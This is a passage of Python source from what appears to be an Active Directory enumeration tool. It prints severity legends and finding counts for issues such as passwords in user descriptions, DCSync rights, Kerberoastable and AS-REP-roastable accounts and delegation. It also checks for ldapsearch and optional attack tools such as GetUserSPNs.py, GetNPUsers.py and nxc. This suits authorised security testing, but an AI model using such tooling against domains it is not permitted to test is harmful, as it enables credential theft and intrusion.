{Colors.DIM}    Legend:{Colors.RESET}
    {Colors.CRITICAL} !! {Colors.RESET} = CRITICAL (passwords, dcsync, etc.)
    {Colors.HIGH}►{Colors.RESET} = HIGH (kerberoast, delegation, etc.)
    {Colors.MEDIUM}►{Colors.RESET} = MEDIUM (interesting groups, acls)
    {Colors.LOW}►{Colors.RESET} = LOW (informational)
    {Colors.INFO}•{Colors.RESET} = INFO
"""
        self.print_line(banner)

    def _print_summary(self, findings: Dict) -> None:
        """Print findings summary with severity counts"""
        self.print_line(SH.section_header("FINDINGS SUMMARY"))

        critical = 0
        high = 0
        medium = 0

        if findings.get('password_descriptions'):
            critical += len(findings['password_descriptions'])
        if findings.get('delegation'):
            high += len(findings['delegation'])
        if findings.get('kerberoast'):
            high += 1
        if findings.get('asreproast'):
            high += 1

        if critical > 0:
            self.print_line(f"  {Colors.CRITICAL} CRITICAL: {critical} {Colors.RESET}")
        if high > 0:
            self.print_line(f"  {Colors.HIGH}HIGH: {high}{Colors.RESET}")
        if medium > 0:
            self.print_line(f"  {Colors.MEDIUM}MEDIUM: {medium}{Colors.RESET}")

        if critical == 0 and high == 0:
            self.print_line(f"  {Colors.BRIGHT_GREEN}No critical findings{Colors.RESET}")

    def check(self) -> bool:
        """Check if required tools are available"""
        required = ["ldapsearch"]
        optional = ["bloodhound-python", "GetUserSPNs.py", "GetNPUsers.py", "nxc"]

        has_ldapsearch = find_tool("ldapsearch") is not None
        if not has_ldapsearch:
            # Check if ldapsearch is in PATH
            ret, _, _ = self._run_cmd(["which", "ldapsearch"])
            has_ldapsearch = ret == 0

        if not has_ldapsearch:
            self.print_error("ldapsearch is required")
            return False

        return True
